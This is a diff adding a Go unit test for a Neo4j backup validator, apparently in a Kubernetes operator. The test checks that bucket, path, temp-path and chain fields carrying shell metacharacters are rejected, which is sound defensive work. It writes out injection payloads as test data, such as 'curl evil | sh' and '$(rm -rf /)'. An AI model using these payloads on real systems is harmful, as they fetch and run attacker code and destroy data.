@@ -639,3 +639,70 @@ func TestBackupValidator_CloudAtSpecLevel(t *testing.T) {
 		t.Error("expected an error for S3 backup with no cloud provider anywhere")
 	}
 }
+
+// TestBackupValidator_ShellSafetyCharsets pins #219: fields that reach the
+// backup Job's /bin/sh -c command are rejected up front when they carry shell
+// metacharacters (the command builder also quotes them — defense-in-depth).
+func TestBackupValidator_ShellSafetyCharsets(t *testing.T) {
+	validator := NewBackupValidator()
+	base := func() *neo4jv1beta1.Neo4jBackup {
+		return &neo4jv1beta1.Neo4jBackup{
+			ObjectMeta: metav1.ObjectMeta{Name: "b", Namespace: "ns"},
+			Spec: neo4jv1beta1.Neo4jBackupSpec{
+				Target:  neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "c"},
+				Storage: neo4jv1beta1.StorageLocation{Type: "s3", Bucket: "my-bucket", Path: "backups/prod"},
+				Cloud:   &neo4jv1beta1.CloudBlock{Provider: "aws"},
+			},
+		}
+	}
+
+	t.Run("clean spec passes", func(t *testing.T) {
+		if errs := validator.Validate(base()); len(errs) != 0 {
+			t.Fatalf("expected no errors, got %v", errs)
+		}
+	})
+
+	t.Run("bucket with metacharacters rejected", func(t *testing.T) {
+		b := base()
+		b.Spec.Storage.Bucket = "bucket; curl evil | sh"
+		if errs := validator.Validate(b); len(errs) == 0 {
+			t.Fatal("expected bucket charset rejection")
+		}
+	})
+
+	t.Run("path with command substitution rejected", func(t *testing.T) {
+		b := base()
+		b.Spec.Storage.Path = "x$(rm -rf /)"
+		if errs := validator.Validate(b); len(errs) == 0 {
+			t.Fatal("expected path charset rejection")
+		}
+	})
+
+	t.Run("tempPath must be absolute and clean", func(t *testing.T) {
+		b := base()
+		b.Spec.Options = &neo4jv1beta1.BackupOptions{TempPath: "/tmp/ok-dir_1"}
+		if errs := validator.Validate(b); len(errs) != 0 {
+			t.Fatalf("clean absolute tempPath must pass, got %v", errs)
+		}
+		b.Spec.Options.TempPath = "relative/path"
+		if errs := validator.Validate(b); len(errs) == 0 {
+			t.Fatal("relative tempPath must be rejected")
+		}
+		b.Spec.Options.TempPath = "/tmp/x;evil"
+		if errs := validator.Validate(b); len(errs) == 0 {
+			t.Fatal("metacharacter tempPath must be rejected")
+		}
+	})
+
+	t.Run("chainFromBackup must be a resource name", func(t *testing.T) {
+		b := base()
+		b.Spec.ChainFromBackup = "daily-full"
+		if errs := validator.Validate(b); len(errs) != 0 {
+			t.Fatalf("valid chainFromBackup must pass, got %v", errs)
+		}
+		b.Spec.ChainFromBackup = "x; touch /tmp/pwned"
+		if errs := validator.Validate(b); len(errs) == 0 {
+			t.Fatal("metacharacter chainFromBackup must be rejected")
+		}
+	})
+}
